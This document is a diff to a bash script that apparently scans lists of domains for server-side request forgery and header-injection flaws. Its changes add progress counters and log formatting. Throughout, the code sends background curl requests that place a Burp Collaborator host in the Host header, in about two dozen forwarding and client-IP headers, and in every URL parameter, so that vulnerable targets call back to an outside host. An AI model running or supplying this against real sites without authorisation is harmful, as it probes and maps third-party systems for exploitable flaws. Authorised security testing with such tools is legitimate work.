@@ -35,13 +35,20 @@ print_intro
 # Function to inject Host header
 inject_host_header() {
   echo -e "${light_blue}[*] Injecting Burp Collaborator into Host header...${NC}"
+  counter=0
+  total_urls=$(wc -l < "$list")
   while IFS= read -r domain; do
     # Check if the domain is empty
+    if [[ -z "$domain" ]]; then
+      continue
+    fi
     current_time=$(date +"%H:%M:%S")
+    # Increment the counter
+    counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
     curl -H "Host: $Collab"  "$domain" &> /dev/null &
     # Print the processed domain for reference (optional)
-    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
+    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
@@ -51,21 +58,23 @@ inject_host_header() {
 # Function to inject into common headers
 inject_common_headers() {
   echo -e "${light_blue}[*] Injecting Burp Collaborator into common headers...${NC}"
+  counter=0
+  total_urls=$(wc -l < "$list")  
   while IFS= read -r domain; do
     # Check if the domain is empty
     if [[ -z "$domain" ]]; then
       continue
     fi
     current_time=$(date +"%H:%M:%S")
-
+    # Increment the counter
+    counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
     curl -H "From: root@$Collab" -H "User-Agent: Mozilla/5.0 root@$Collab" -H "Referer: http://$Collab/ref" -H "X-Original-URL: http://$Collab/" -H "X-Wap-Profile: http://$Collab/wap.xml" -H "Profile: http://$Collab/wap.xml" -H "X-Arbitrary: http://$Collab/" -H "X-HTTP-DestinationURL: http://$Collab/" -H "X-Forwarded-Proto: http://$Collab/" -H "Origin: http://$Collab/" -H "X-Forwarded-Host: $Collab" -H "X-Host: $Collab" -H "Proxy-Host: $Collab" -H "Destination: $Collab" -H "Proxy: http://$Collab/" -H "X-Forwarded-For: $Collab" -H "Contact: root@$Collab" -H "Forwarded: for=spoofed.$Collab;by=spoofed.$Collab;host=spoofed.$Collab" -H "X-Client-IP: $Collab" -H "Client-IP: $Collab" -H "True-Client-IP: $Collab" -H "CF-Connecting_IP: $Collab" -H "X-Originating-IP: $Collab" -H "X-Real-IP: $Collab" "$domain" &> /dev/null &    # Print the processed domain for reference (optional)
-    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_common_headers.log
+    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_common_headers.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
   echo -e "${GREEN}✅ Injecting Burp Collaborator into common headers ${YELLOW}Finished ${NC}"
-
 }
 
 # Function to handle the "-e" option
@@ -90,6 +99,8 @@ inject_url_parameters() {
   echo "">>filtered_params.txt
 
   echo -e "${light_blue}[*] injecting Burp Collaborator into parameters...${NC}"
+  counter=0
+  total_urls=$(wc -l < "filtered_params.txt")
   # Loop through each URL in the file
   while IFS= read -r url; do
   # Skip empty lines
@@ -101,18 +112,20 @@ inject_url_parameters() {
 
   # Base URL without parameters
   base_url=$(echo "$url" | grep -oP '^[^?]+')
-
+  p=0
+  counter=$((counter + 1))
   # Loop through each parameter
   for param in "${params[@]}"; do
     # Extract key and value
     key=$(echo "$param" | cut -d'=' -f1)
     value=$(echo "$param" | cut -d'=' -f2)
     current_time=$(date +"%H:%M:%S")
+    p=$((p + 1))
     # Construct new URL with the parameter injected
     new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
     # Send the request
     curl -L "$new_url" &> /dev/null &
-    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a inject_url_parameters.log
+    echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a inject_url_parameters.log
     sleep $delay
   done
   done < "filtered_params.txt"
@@ -146,4 +159,3 @@ for stage in "${stages[@]}"; do
     parameters) handle_e_option ;;
   esac
 done
-
